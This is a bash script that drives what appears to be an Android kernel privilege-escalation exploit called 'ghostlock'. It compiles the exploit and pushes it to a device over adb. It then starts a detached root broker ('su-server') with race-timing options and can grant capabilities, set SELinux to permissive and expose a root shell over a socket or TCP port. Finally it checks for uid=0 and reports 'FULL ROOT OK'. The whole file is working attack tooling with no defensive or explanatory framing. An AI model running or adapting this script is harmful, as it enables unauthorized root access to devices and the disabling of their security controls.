#!/usr/bin/env bash
set -euo pipefail

ADB="${ADB:-adb}"
SERIAL="${SERIAL:-}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NDK_ROOT="${NDK_ROOT:-}"
DEVICE_BIN="${DBY2_DEVICE_BIN:-/data/local/tmp/ghostlock_dby2}"
DEVICE_LOG="${DBY2_LOG_FILE:-/data/local/tmp/dby2-root.log}"
HARDEN_LOG="${DBY2_HARDEN_LOG:-/data/local/tmp/dby2-harden.log}"
SLOT_FILE="${DBY2_SLOT_FILE:-/data/local/tmp/gl.slot}"
GRANT_CAPS="${DBY2_GRANT_CAPS:-0}"
SELINUX_RELAX="${DBY2_SELINUX_RELAX:-0}"
SELINUX_PERMISSIVE="${DBY2_SELINUX_PERMISSIVE:-0}"
HARDEN="${DBY2_HARDEN:-1}"
MOUNT_VERIFY="${DBY2_MOUNT_VERIFY:-0}"
SHELL_VERIFY="${DBY2_SHELL_VERIFY:-1}"
RUNTIME_CPU_ARG=
if [ -n "${DBY2_RUNTIME_CPU:-}" ]; then
  RUNTIME_CPU_ARG="--runtime-cpu $DBY2_RUNTIME_CPU"
fi
SOCKET_ARG=
TRANSPORT_ARG=
VERIFY_DIR="${DBY2_VERIFY_DIR:-/data/local/tmp/glroot-verify}"
if [ -n "${DBY2_SOCKET_NAME:-}" ]; then
  SOCKET_ARG="--socket-name $DBY2_SOCKET_NAME"
fi
if [ -n "${DBY2_TCP_PORT:-}" ]; then
  TRANSPORT_ARG="--tcp-port $DBY2_TCP_PORT"
fi
KERNEL_DOMAIN_ARG=
if [ "${DBY2_KERNEL_DOMAIN:-0}" = "1" ]; then
  KERNEL_DOMAIN_ARG=--kernel-domain
fi
ROOT_MODE_ARG=--simple-root
if [ "${DBY2_DIRECT_ROOT:-0}" = "1" ]; then
  ROOT_MODE_ARG=--escalate
fi
if [ "${DBY2_CRED_ONLY:-0}" = "1" ]; then
  ROOT_MODE_ARG=--cred-only
fi
MODULE_PREP_ARG=
if [ "${DBY2_MODULE_PREP:-0}" = "1" ]; then
  MODULE_PREP_ARG=--module-prep
fi
CAP_BOUNDING_ARG=
if [ "${DBY2_NO_CAP_BOUNDING:-0}" = "1" ]; then
  CAP_BOUNDING_ARG=--no-cap-bounding
fi

apply_root_extras() {
  if [ "$GRANT_CAPS" = "1" ]; then
    "$ADB" -s "$SERIAL" shell \
      "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh GLCAPGRANT"
  fi
  if [ "$SELINUX_RELAX" = "1" ]; then
    "$ADB" -s "$SERIAL" shell \
      "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh GLSELINUX"
  fi
  if [ "$SELINUX_PERMISSIVE" = "1" ]; then
    "$ADB" -s "$SERIAL" shell \
      "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh GLPERMISSIVE"
  fi
}

verify_full_root() {
  if [ "$SHELL_VERIFY" = "0" ]; then
    "$ADB" -s "$SERIAL" shell \
      "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh STATUS"
    "$ADB" -s "$SERIAL" shell \
      "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh GLCAP"
    return 0
  fi

  if [ "$MOUNT_VERIFY" = "1" ]; then
    verify_cmd="d=$VERIFY_DIR/run-\$\$; mkdir -p \$d || exit 11; mount -t tmpfs -o mode=0700 tmpfs \$d || exit 12; echo verified >\$d/proof || exit 13; cat \$d/proof || exit 14; umount \$d || exit 15; rmdir \$d || exit 16; id; echo ROOT_USABLE_VERIFY=ok"
  else
    verify_cmd="d=$VERIFY_DIR/run-\$\$; mkdir -p \$d || exit 11; echo verified >\$d/proof || exit 12; cat \$d/proof || exit 13; rm -rf \$d || exit 14; id; echo ROOT_USABLE_VERIFY=ok"
  fi
  verify_output="$("$ADB" -s "$SERIAL" shell \
    "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh '$verify_cmd'" 2>&1)"
  printf '%s\n' "$verify_output"
  if ! printf '%s\n' "$verify_output" | grep -q 'ROOT_USABLE_VERIFY=ok' ||
      ! printf '%s\n' "$verify_output" | grep -q 'uid=0(root)'; then
    echo "usable-root verification failed" >&2
    return 1
  fi
}

if [ -z "$SERIAL" ]; then
  SERIAL="$("$ADB" devices | tr -d '\r' |
    awk 'NR > 1 && $2 == "device" { print $1; exit }')"
fi
if [ -z "$SERIAL" ]; then
  echo "no online adb device; set SERIAL explicitly" >&2
  exit 1
fi
if [ "$("$ADB" -s "$SERIAL" get-state 2>/dev/null | tr -d '\r')" != "device" ]; then
  echo "device $SERIAL is not available over adb" >&2
  exit 1
fi

existing_status="$("$ADB" -s "$SERIAL" shell \
  "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh STATUS" 2>/dev/null || true)"
if printf '%s\n' "$existing_status" | grep -q 'euid=0'; then
  printf '%s\n' "$existing_status"
  apply_root_extras
  verify_full_root
  echo "FULL ROOT ALREADY ACTIVE: $DEVICE_BIN --rsh-shell"
  exit 0
fi

make_arguments=(-C "$SCRIPT_DIR" -j4 LOGCAT=0)
if [ -n "$NDK_ROOT" ]; then
  make_arguments+=(NDK_ROOT="$NDK_ROOT")
fi
make "${make_arguments[@]}"
push_source="$SCRIPT_DIR/build/bin/ghostlock_exe"
if [[ "$(basename "$ADB")" == *.exe ]]; then
  if command -v wslpath >/dev/null 2>&1; then
    push_source="$(wslpath -w "$push_source")"
  elif command -v cygpath >/dev/null 2>&1; then
    push_source="$(cygpath -w "$push_source")"
  fi
fi
"$ADB" -s "$SERIAL" push "$push_source" "$DEVICE_BIN"
"$ADB" -s "$SERIAL" shell \
  "chmod 755 $DEVICE_BIN; touch $SLOT_FILE; chmod 666 $SLOT_FILE; \
   mkdir -p $VERIFY_DIR; chmod 777 $VERIFY_DIR"

if [ "$HARDEN" = "1" ]; then
  "$ADB" -s "$SERIAL" shell \
    "$DEVICE_BIN --harden --detach --probe-cycle --spin-park --no-rt \
     $RUNTIME_CPU_ARG --attempts 1 --slot-file $SLOT_FILE \
     --log-file $HARDEN_LOG --fsync"
fi

# The broker and every write worker stay alive after boot_id changes. Detached
# workers must never exit through futex_exit_release() while pi_blocked_on
# still points at the consumed stack overlay.
"$ADB" -s "$SERIAL" shell \
  "$DEVICE_BIN $MODULE_PREP_ARG $CAP_BOUNDING_ARG $ROOT_MODE_ARG \
   --su-server --detach --probe-cycle \
   --spin-park --no-rt \
   $RUNTIME_CPU_ARG --attempts 1 --leak-timeout 60 --fsync \
   --task-period 100000 --task-iters 20000 --task-rounds 4 \
   $KERNEL_DOMAIN_ARG $SOCKET_ARG $TRANSPORT_ARG \
   --slot-file $SLOT_FILE --log-file $DEVICE_LOG \
   </dev/null >/dev/null 2>&1 &"

for _ in $(seq 1 180); do
  status="$("$ADB" -s "$SERIAL" shell \
    "$DEVICE_BIN $SOCKET_ARG $TRANSPORT_ARG --rsh STATUS" 2>&1 || true)"
  if printf '%s\n' "$status" | grep -q 'euid=0'; then
    printf '%s\n' "$status"
    apply_root_extras
    verify_full_root
    echo "FULL ROOT OK: $DEVICE_BIN --rsh-shell"
    exit 0
  fi
  sleep 2
done

echo "root broker did not become ready; recent log:" >&2
"$ADB" -s "$SERIAL" shell "tail -80 $DEVICE_LOG" >&2 || true
exit 1
